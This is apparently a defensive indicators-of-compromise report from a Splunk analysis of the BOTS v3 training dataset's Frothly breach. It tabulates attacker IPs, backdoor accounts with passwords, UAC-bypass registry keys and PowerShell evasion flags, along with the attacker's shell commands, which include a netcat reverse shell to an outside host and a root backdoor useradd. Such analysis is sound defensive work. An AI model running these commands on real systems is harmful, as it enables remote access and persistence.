# Indicators of Compromise (IOCs)
## BOTS v3 — Frothly Enterprise Breach

> All IOCs were identified through hands-on log analysis
> in Splunk using the BOTS v3 dataset.
> Investigation date : June 2026

---

## 🌐 Network IOCs

### IP Addresses

| IP | Role | Confirmed by |
|----|------|-------------|
| 192.168.8.103 | Attacker 1 — Apache Struts exploit | stream:http POST logs |
| 192.168.8.112 | Attacker 2 — SugarCRM credential stuffing | stream:http POST logs |
| 45.77.53.176 | External C2 server | stream:tcp + stream:http |
| 192.168.9.30 | HOTH — Internal C2 / Struts server | stream:http |

### Ports & Connections

| IP | Port | Protocol | Usage | Connections |
|----|------|----------|-------|-------------|
| 45.77.53.176 | 8088 | TCP | Reverse shell (HOTH) | Confirmed |
| 45.77.53.176 | 443 | TCP/HTTPS | C2 persistent (FYODOR-L) | 3884 |
| 45.77.53.176 | 443 | TCP/HTTPS | C2 persistent (ABUNGST-L) | 1071 |
| 45.77.53.176 | 3333 | TCP | Tool download | Confirmed |
| 192.168.9.30 | 8080 | HTTP | Internal C2 / Struts app | Confirmed |
| HOTH | 1337 | TCP | Backdoor listener (PID 14356) | osquery confirmed |

### Suspicious URLs

| URL | Method | Description |
|-----|--------|-------------|
| /frothlyinventory/integration/saveGangster.action | POST | Apache Struts RCE endpoint |
| /frothlyinventory/showcase.action | POST | Secondary Struts endpoint |
| /login/process.php | POST | C2 communication |
| /news.php | GET | C2 communication |
| /admin/get.php | GET | C2 payload delivery |
| /suitecrm/index.php | POST | SugarCRM credential stuffing target |

### DNS Suspicious Queries

| Domain | Type | Host | Suspicion |
|--------|------|------|-----------|
| koko10.brewertalk.com | NXDOMAIN | Multiple | Possible DGA |
| forumtest.brewertalk.com | NXDOMAIN | Multiple | Possible DGA |
| email5.brewertalk.com | NXDOMAIN | Multiple | Possible DGA |

---

## 💻 Host IOCs

### Compromised Hosts

| Host | IP | OS | Role | Status |
|------|----|----|------|--------|
| HOTH | 192.168.9.30 | Linux Ubuntu 16.04 | Apache Struts server | Fully compromised |
| FYODOR-L | 192.168.70.186 | Windows | Workstation | Fully compromised |
| ABUNGST-L | 192.168.24.128 | Windows | Workstation | C2 active |

### Backdoor Accounts

| Account | OS | UID/Group | Password | Created by | EventCode |
|---------|----|-----------|----------|------------|-----------|
| tomcat7 | Linux | UID=0 GID=0 (root) | ilovedaviderve | OGNL payload | syslog useradd |
| svcvnc | Windows | Administrators | Password123! | PowerShell script | 4720/4732 |

### Malicious Files

| File Path | Host | Description |
|-----------|------|-------------|
| /tmp/backpipe | HOTH | Named pipe for reverse shell |
| /tmp/colonel | HOTH | Base64 encoded kernel exploit |
| /tmp/colonel.c | HOTH | Decoded BPF verifier kernel exploit |
| C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe | FYODOR-L | Malicious exe masquerading as IE |
| logos.png | FYODOR-L | Malicious tool disguised as image |

### Malicious Processes

| Process | Host | Parent | Why Suspicious |
|---------|------|--------|----------------|
| iexeplorer.exe | FYODOR-L | powershell.exe | Fake IE name, launched from Temp |
| fodhelper.exe | FYODOR-L | powershell.exe | UAC bypass vehicle |
| net.exe | FYODOR-L | powershell.exe | Backdoor account creation |
| net1.exe | FYODOR-L | powershell.exe | Backdoor account creation |
| nc (netcat) | HOTH | sh | Reverse shell to 45.77.53.176 |

---

## 🗝️ Registry IOCs

| Key | Value | Description |
|-----|-------|-------------|
| HKCU\Software\Classes\ms-settings\Shell\Open\command | PowerShell payload | UAC Bypass — fodhelper trigger |
| HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute | (empty) | UAC Bypass — required empty value |
| HKCU\Software\Microsoft\Windows Update\Update | Base64 encoded payload | Hidden payload storage |

**Evidence :** Sysmon EventID 13 (Registry Value Set) confirmed all modifications.

---

## 🔑 Credentials IOCs

| Account | Password | Service | Used for |
|---------|----------|---------|---------|
| tomcat7 | ilovedaviderve | Linux | Backdoor root account on HOTH |
| svcvnc | Password123! | Windows | Backdoor admin account on FYODOR-L |
| abugnst | ilovedavsbasement | SugarCRM | Credential stuffing — ABUNGST-L access |

---

## 📜 PowerShell IOCs

| Indicator | Description |
|-----------|-------------|
| -NoP -NonI -W Hidden -enc | Obfuscated PowerShell execution flags |
| amsiInitFailed | AMSI bypass technique |
| New-Object System.Net.WebClient | Download payload from C2 |
| Invoke-Expression (IEX) | In-memory execution — no files on disk |
| RC4 decryption routine | Encrypted payload decryption |

---

## 🐚 Linux Shell IOCs

| Command | Host | Purpose |
|---------|------|---------|
| cat /etc/passwd | HOTH | User enumeration |
| sudo bash | HOTH | Privilege escalation attempt |
| ls /tmp | HOTH | File system discovery |
| mknod /tmp/backpipe p | HOTH | Named pipe creation for reverse shell |
| nc 45.77.53.176 8088 | HOTH | Reverse shell connection |
| echo [base64] >> /tmp/colonel | HOTH | Kernel exploit staging |
| base64 --decode /tmp/colonel > /tmp/colonel.c | HOTH | Exploit decoding |
| useradd -ou tomcat7 -p ilovedaviderve | HOTH | Backdoor account creation |

---

## 🌐 HTTP IOCs

| Indicator | Value | Description |
|-----------|-------|-------------|
| User-Agent | python-requests/2.18.4 | Apache Struts exploit tool |
| POST parameter | name=(#cmd='...') | OGNL injection payload |
| Session cookie | PHPSESSID=ck2dbgeimem4h653tr1fbubf04 | Stolen SugarCRM session |
| Attacker requests | 15 POST to saveGangster.action | 07:05-07:34 AM |

---

## ⏱️ Attack Timeline

| Time | Host | Event | IOC |
|------|------|-------|-----|
| 06:23 AM | HOTH | FyodorMalteskesko browses SugarCRM | PHPSESSID=ck2dbge... |
| 07:05 AM | HOTH | First Struts exploit POST | 192.168.8.103 → saveGangster.action |
| 07:08 AM | HOTH | Kernel exploit staged | /tmp/colonel base64 |
| 07:24 AM | ABUNGST-L | SugarCRM credential stuffing | 192.168.8.112 → abugnst |
| 07:34 AM | HOTH | Last Struts exploit POST | 15th POST request |
| ~22:00 PM | FYODOR-L | PowerShell obfuscated executed | -enc -NoP -W Hidden |
| 22:08:17 PM | FYODOR-L | svcvnc account created | EventCode 4720 |
| 22:08:35 PM | FYODOR-L | svcvnc added to Administrators | EventCode 4732 |
| All day | All | C2 beaconing | 45.77.53.176:443 |

---

## 📊 IOCs Summary

| Category | Count |
|----------|-------|
| Malicious IPs | 4 |
| Malicious URLs | 6 |
| Suspicious DNS domains | 3 |
| Malicious files | 5 |
| Malicious processes | 5 |
| Registry keys modified | 3 |
| Compromised accounts | 3 |
| Compromised hosts | 3 |
| **Total IOCs** | **32** |
